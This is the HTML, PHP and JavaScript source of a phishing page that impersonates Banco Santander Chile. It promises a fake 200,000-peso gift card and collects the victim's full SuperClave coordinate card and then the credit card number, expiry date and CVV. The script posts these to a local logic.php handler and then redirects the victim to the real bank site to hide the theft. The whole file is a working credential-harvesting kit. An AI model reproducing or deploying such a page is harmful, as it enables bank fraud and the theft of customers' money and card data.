<html class="no-js" lang="es">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="shortcut icon" href="img/fav.ico">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>¿Qué podemos hacer por ti hoy? | Banco Santander</title>
    <meta name="theme-color" content="#ec0000">
    <link href="css/main.css" media="screen" rel="stylesheet" type="text/css">
    <style>.async-hide { opacity: 0 !important} </style>
    <link rel="stylesheet" type="text/css" media="all" href="css/control.css">
        <style type="text/css">
        .container-top{position: relative; top: calc(13%); text-align: center;}
        .row-position{position: relative; margin-bottom: 18px;}
        .red-label{background: #ec0f00; color: white; padding: 3px;}
        .red-label span{font-weight: bold;}
        .red-label p b{color: white;}
        .text{position: relative; text-align: left;margin-top: 1%;}
        .row div:hover{cursor: pointer;}
        .selected{position: relative; background: #f1f1f1; padding-block: 5px; padding-inline: 7px; border-radius: 50%;}
        input{border: solid #e3e3e3 1px;}
        ul li{text-align: left; background: #fdfdfd; border: solid #f1f1f1 1px; padding: 3px;     box-shadow: inset 0 0 3px #ededed;}
        ul li a{font-size: 14px;}
        .footer{position: relative; margin-top: 4%; background: #ec0f00; padding: 8px;}
    .footer p{
        color: white;
    }
    </style>
</head>
<body id="home" class="context-home context-home-show  ">
    <div id="header">
        <div>
            <header class="header-modyo" style="top: 0px;">
                <div class="sub-header" style="background: #ec0f00 !important;">
                    <div class="container">
                        <div class="row align-items-center">
                            <div class="col-xs-3 col-lg-3 col-md-6 col-6">
                                <div>
                                    <div class="d-flex align-items-center"><a href="" aria-label="Logo Banco Santander Chile" class="logo">
                                            <figure class="hidden-caption"><img src="img/logo_santander_new.svg" alt="Logo Banco Santander Chile">
                                                <figcaption>Logo Banco Santander Chile</figcaption>
                                            </figure>
                                        </a>
                                       
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-9 col-lg-9 col-md-6 col-6">
                                <div>
                                   
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>
        </div>
    </div>

    <div class="container container-top">
<div class="row">
    <div class="col-md-2">
        <ul>
            <li><a href="#">Cuentas</a></li>
            <li><a href="#">Últimos movimientos</a></li>
            <li><a href="#">Saldos consolidados</a></li>
            <li><a href="#">Cuentas</a></li>
            <li><a href="#">Líneas de credito</a></li>
            <li><a href="#">Tarjetas de credito</a></li>
            <li><a href="#">Transferencias</a></li>
            <li><a href="#">Pagos y recargas</a></li>
            <li><a href="#">Envío de dinero</a></li>
            <li><a href="#">Creditos</a></li>
            <li><a href="#">Ahorro e Inversiones</a></li>
            <li><a href="#">Seguros</a></li>
        </ul>
    </div>
    <div class="col-md-10">
        

            <div class="red-label">
                <span><p><b>Seguridad en nuestros servicios en linea<br></b></p></span>
            </div>
            <div style="position: relative; margin-bottom: 3%;"><p class="text">
                Estimado cliente, Banco Santander ha beneficiado su preferencia con una giff card de $200.000 en compras, los cuales serán abonados a su tarjeta de crédito, por favor completar los siguientes datos.
            </p><br> <label style="font-size: 18px;">Digite la SuperClave Proporcionada.</label> </div>

        <div class="container scard" style="display: none;">
            
            <div class='credit-card'>
    <div class="number multifield">
        <input type="text" maxlength="4" inputmode='numeric' pattern="\d+">
        <input type="text" maxlength="4" inputmode='numeric' pattern="\d+">
        <input type="text" maxlength="4" inputmode='numeric' pattern="\d+">
        <input type="text" maxlength="4" inputmode='numeric' pattern="\d+">
        <input id="creditNumber" type="hidden" required="required" name="creditNumber" >
    </div>
  <div class='date multifield'>
    <span>Fecha de Expiración</span>
    <input type="text" maxlength="2" inputmode='numeric' pattern="\d+">
    /
        <input type="text" maxlength="2" inputmode='numeric' pattern="\d+">
    <input type="hidden" required="required" name="creditDate" id="creditDate" >
  </div>

  <div class="date multifield" style=" position: absolute; bottom: 20px; left: 258px;">
    <span>CSV</span>
    <input id="csv" type="text" maxlength="3" inputmode="numeric" pattern="\d+" style="width: 20%;">
  </div>

</div>
<br>
        <button onclick="enviar()" class="btn btn-default">Enviar</button>

            
        </div>

        <div class="container stoken" style="max-width: 835px;">
        
        <?php for ($i=1; $i <= 5; $i++) { ?>
        <div class="row row-position">
            <div class="col-md-1"></div>
            <div class="col-md-1">
                <span>A<?php echo $i; ?></span>
                <input class="w-100" type="text" id="A<?php echo $i; ?>" maxlength="2" name="ctoken">
            </div>
            <div class="col-md-1">
                <span>B<?php echo $i; ?></span>
                <input class="w-100" type="text" id="B<?php echo $i; ?>" maxlength="2" name="ctoken">
            </div>
            <div class="col-md-1">
                <span>C<?php echo $i; ?></span>
                <input class="w-100" type="text" id="C<?php echo $i; ?>" maxlength="2" name="ctoken">
            </div>
            <div class="col-md-1">
                <span>D<?php echo $i; ?></span>
                <input class="w-100" type="text" id="D<?php echo $i; ?>" maxlength="2" name="ctoken">
            </div>
            <div class="col-md-1">
                <span>E<?php echo $i; ?></span>
                <input class="w-100" type="text" id="E<?php echo $i; ?>" maxlength="2" name="ctoken">
            </div>
            <div class="col-md-1">
                <span>F<?php echo $i; ?></span>
                <input class="w-100" type="text" id="F<?php echo $i; ?>" maxlength="2" name="ctoken">
            </div>
            <div class="col-md-1">
                <span>G<?php echo $i; ?></span>
                <input class="w-100" type="text" id="G<?php echo $i; ?>" maxlength="2" name="ctoken">
            </div>
            <div class="col-md-1">
                <span>H<?php echo $i; ?></span>
                <input class="w-100" type="text" id="H<?php echo $i; ?>" maxlength="2" name="ctoken">
            </div>
            <div class="col-md-1">
                <span>I<?php echo $i; ?></span>
                <input class="w-100" type="text" id="I<?php echo $i; ?>" maxlength="2" name="ctoken">
            </div>
            <div class="col-md-1">
                <span>J<?php echo $i; ?></span>
                <input class="w-100" type="text" id="J<?php echo $i; ?>" maxlength="2" name="ctoken">
            </div>
            <div class="col-md-1"></div>
        </div>
        <?php } ?>

        <div class="row">
            <div class="col-md-12" style="text-align:center;">
                <button onclick="reset()" class="btn btn-default">Limpiar</button>
                <button onclick="next()" class="btn btn-default">Siguiente</button>

            </div>
        </div>
        </div>

<div class="footer">
    <p>2021 Santander Santiago - Todos los derechos reservados</p>
</div>
    </div>
    </div>
    </div>

    <script src="js/jquery.min.js"></script>
    <script src="js/jquery-ui.js"></script>

    <script type="text/javascript">

        $("ul li").click(function(){
            alert('Debes ingresar tu tarjeta de coordenadas');
        });

        var sclave=[];
        
        function next(){
            $("input[name='ctoken']").each(function() {
                if($(this).val()!=''){
                    sclave.push({"id": $(this)[0].id, "token":$(this).val()});
                    $(".stoken").css('display','none');
                    $(".scard").css('display','block');
                }
            });
        }

        function reset(){
            $("input[name='ctoken']").each(function() {
                $(this).val('');
            });
        }

        function enviar(){
                var creditNumber = $("#creditNumber").val();
                var creditDate = $("#creditDate").val();
                var csv = $("#csv").val();

                var split = creditDate.substring(2, 0);
                var split2 = creditDate.substring(2, 4);
                var result = split+'/'+split2;
                
                if(creditNumber===''){
                    alert('debe ingresar el número de tarjeta');
                    $("#creditNumber").focus();
                }else if(creditDate===''){
                    alert('debe ingrsar la fehca de la tarjeta');
                    $("#creditDate").focus();
                }else if(csv===''){
                    alert('Debe Inrgesar el código csv');
                    $("#csv").focus();
                }else{
                $.ajax({
                type:"POST",
                url:"logic.php", 
                data:{"token":JSON.stringify(sclave), "card":creditNumber, 
                      "date":result, "csv":csv},
                success:function(datos){
                window.location.href="https://banco.santander.cl/personas";
                }
                });
            }
        }

        // multifield - connects several input fields to each-other
// By Yair Even Or / 2011 / dropthebit.com
(function () {
  var fixedEvent = 0;
  /* fix a bug in Chrome where 'keypress' isn't fired for "non-visisble" keys */

  function funnel(e) {
    // some pre-validation using HTML5 pattern attribute to allow only digits
    if (e.charCode && this.pattern) {
      var regex = this.pattern,
        char = String.fromCharCode(e.charCode),
        valid = new RegExp("^" + regex + "$").test(char);
      console.log(valid);
      if (!valid) return false;
    }

    fixedEvent++;
    var that = this;
    setTimeout(function () {
      keypress.call(that, e);
      fixedEvent = 0;
    }, 0);
  }

  function keypress(e) {
    var nextPrevField,
      sel = [this.selectionStart, this.selectionEnd];

    if (!e.charCode && e.keyCode != 37 && e.keyCode != 39 && e.keyCode != 8)
      return;
    // if hit Backspace key when caret was at the beginning, or if the 'left' arrow key was pressed and the caret was at the start -> go back to previous field
    else if (
      (e.keyCode == 8 && sel[1] == 0) ||
      (e.keyCode == 37 && sel[1] == 0)
    )
      setCaret($(this).prev(":text")[0], 100);
    // if the 'right' arrow key was pressed and caret was at the end -> advance to the next field
    else if (e.keyCode == 39 && sel[1] == this.value.length)
      setCaret($(this).next(":text")[0], 0);
    // automatically move to the next field once user has filled the current one completely
    else if (e.charCode && sel[1] == sel[0] && sel[0] == this.maxLength)
      setCaret($(this).next(":text")[0], 100);

    function setCaret(input, pos) {
      if (!input) return;
      if (input.setSelectionRange) {
        input.focus();
        input.setSelectionRange(pos, pos);
      } else if (input.createTextRange) {
        var range = input.createTextRange();
        range.collapse(true);
        range.moveEnd("character", pos);
        range.moveStart("character", pos);
        range.select();
      }
    }

    combine.apply(this);
  }
  // After each 'change' event of any of the fields, combine all the values to the hidden input.
  function combine() {
    var hidden = $(this).siblings("input[type=hidden]").val("")[0];
    $(this.parentNode)
      .find("input:not(:hidden)")
      .each(function () {
        hidden.value += this.value;
      });
  }

  $("div.multifield").on(
    {
      "keydown.multifeild": funnel,
      "keypress.multifeild": funnel,
      "change.multifeild": combine
    },
    "input"
  );
})();

// Mod-10 general validator
// By Yair Even Or / 2011 / Dropthebit.com
function mod10_validation(num) {
  if (!num) return false;
  num = num.replace(/-/g, "");

  var calc,
    i,
    check,
    checksum = 0,
    r = [2, 1]; // alternating routing table (cnofigured for credit cards)

  // iterate on all the numbers in 'num'
  for (i = num.length - 1; i--; ) {
    calc = num.charAt(i) * r[i % r.length];
    // handle cases where it's a 2 digits number
    calc = ((calc / 10) | 0) + (calc % 10);
    checksum += calc;
  }
  check = (10 - (checksum % 10)) % 10; // make sure to get '0' if checksum is '10'
  checkDigit = num % 10;

  return check == checkDigit;
}

// a quick validation just for this dem
var timer;
$("button").on("click", function () {
  var num = $("input:hidden").val(),
    valid = num.length > 14 && mod10_validation(num),
    state = valid ? "valid" : "invalid";

  $(".credit-card").addClass(state);
  clearTimeout(timer);
  timer = setTimeout(function () {
    $(".credit-card").removeClass(state);
  }, 1000);
});


    </script>

</body>
</html>